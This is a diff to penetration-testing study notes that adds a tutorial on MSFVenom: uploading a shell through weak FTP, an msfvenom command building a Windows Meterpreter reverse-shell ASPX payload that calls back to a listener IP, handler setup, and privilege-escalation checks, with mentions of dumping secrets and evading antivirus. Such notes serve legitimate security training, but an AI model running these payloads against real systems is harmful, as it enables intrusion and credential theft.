@@ -518,6 +518,37 @@ lsa_dump_secrets
 ```
 From this point, if the machine was connected to a more extensive network, we could use this loot to pivot through the system, gain access to internal resources and impersonate users with a higher level of access if the overall security posture of the network is weak.
 
+
+# Introduction to MSFVenom
+MSFVenom combines the functionalities of MSFPayload and MSFEncode, which were previously separate tools used alongside msfconsole. It allows penetration testers to create customizable and less detectable payloads. With MSFVenom, users can generate shellcode for specific architectures and OS versions while encoding it to bypass security measures like antivirus and intrusion detection systems.
+
+## Creating Payloads
+When a target has an open FTP port with weak credentials or allows anonymous logins, a PHP shell can be uploaded via FTP and executed through a linked web service. This triggers a reverse TCP connection from the victim machine.
+
+## Scanning the Target
+Using Nmap, you can identify open ports and services. For example, if port 21 (FTP) and port 80 (HTTP) are open, you can connect via FTP and explore the directory, noticing that .aspx reverse shells can be run.
+
+## Generating Payload
+To create a payload, use the command:
+
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
+```
+This command generates an ASPX file that can be triggered through a web service to establish a reverse shell connection.
+
+**Setting Up Multi/Handler**
+
+Start msfconsole and use the multi/handler module to set up a listener for the incoming connection.
+
+**Executing the Payload**
+
+Navigate to the generated ASPX file on the target server to trigger the payload. While the web page may appear blank, a connection will be established in msfconsole, allowing access to the Meterpreter shell.
+
+**Local Exploit Suggester**
+
+The Local Exploit Suggester module can identify potential privilege escalation exploits available for the current user. 
+
+It checks for exploits applicable to the IIS APPPOOL\Web user. If an exploit is found to be vulnerable, it can be tested for privilege escalation.
 # Firewall and IDS/IPS Evasion
 
 - **Endpoint Protection**: Protects individual devices or hosts, typically through antivirus, antimalware, firewalls, and anti-DDoS software (e.g., Avast, Malwarebytes).
